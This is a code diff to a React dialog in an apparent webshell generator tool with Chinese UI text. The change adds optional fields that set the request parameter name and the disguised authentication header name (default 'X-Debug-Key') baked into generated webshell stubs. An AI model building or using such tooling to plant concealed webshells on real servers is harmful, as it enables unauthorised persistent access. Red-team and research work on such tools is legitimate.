@@ -31,6 +31,9 @@ export function GenerateShellDialog({
   const [sessionMode, setSessionMode] = useState(false);
   // 加盐派生：stub 用 salt:password 派生密钥与令牌，登记 Shell 时需填入同一个盐
   const [salted, setSalted] = useState(false);
+  // 传输形态（W2）：参数名 / 鉴权头名烘焙进 NATIVE stub，登记 Shell 时必须一致
+  const [param, setParam] = useState("");
+  const [header, setHeader] = useState("");
   const [result, setResult] = useState<GenerateShellResult | null>(null);
   const [busy, setBusy] = useState(false);
   const [error, setError] = useState("");
@@ -58,7 +61,15 @@ export function GenerateShellDialog({
     setError("");
     setCopied(false);
     try {
-      const res = await api.generateShell(language, encoderId, password, sessionMode, salted);
+      const res = await api.generateShell(
+        language,
+        encoderId,
+        password,
+        sessionMode,
+        salted,
+        param.trim() || undefined,
+        header.trim() || undefined,
+      );
       setResult(res);
       toast.success(`Webshell 代码生成完毕 (${res.filename})`, "生成成功");
     } catch (cause) {
@@ -157,6 +168,33 @@ export function GenerateShellDialog({
             ? "Godzilla 风格：处理器只注入一次，后续请求只传参数。登记 Shell 时需在表单里勾选同名开关；普通 stub 请保持关闭。"
             : `${encoderId} 不使用分阶段载荷${isNativeEncoder(encoderId) ? "（NATIVE 自带内置分发）" : "（请求体直传）"}，生成的始终是普通 stub。`}
         </p>
+
+        {isNativeEncoder(encoderId) && !sessionMode && (
+          <>
+            <label>
+              请求参数名（可选）
+              <input
+                value={param}
+                onChange={(event) => setParam(event.target.value)}
+                placeholder="formData"
+              />
+              <span className="field-hint">
+                NATIVE stub 的请求参数名；留空 = 默认 formData。登记 Shell 时需填入同一个值。
+              </span>
+            </label>
+            <label>
+              鉴权头名（可选）
+              <input
+                value={header}
+                onChange={(event) => setHeader(event.target.value)}
+                placeholder="X-Debug-Key"
+              />
+              <span className="field-hint">
+                NATIVE stub 的鉴权请求头；留空 = 默认 X-Debug-Key。登记 Shell 时需填入同一个值。
+              </span>
+            </label>
+          </>
+        )}
 
         <label style={{ display: "flex", alignItems: "center", gap: 8 }}>
           <input
